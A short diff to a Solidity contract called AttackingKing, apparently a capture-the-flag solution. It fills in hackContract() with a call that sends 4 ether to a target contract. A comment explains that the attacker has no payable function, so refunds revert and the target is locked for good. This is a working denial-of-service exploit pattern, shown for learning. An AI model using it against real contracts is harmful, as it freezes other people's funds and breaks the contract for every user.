@@ -11,6 +11,7 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // No payable function, canot receive ether. Funds cannot be returned, and transcations reverted forever
+        (bool response, ) = address(contractAddress).call{value: 4 ether}("");
     }
 }
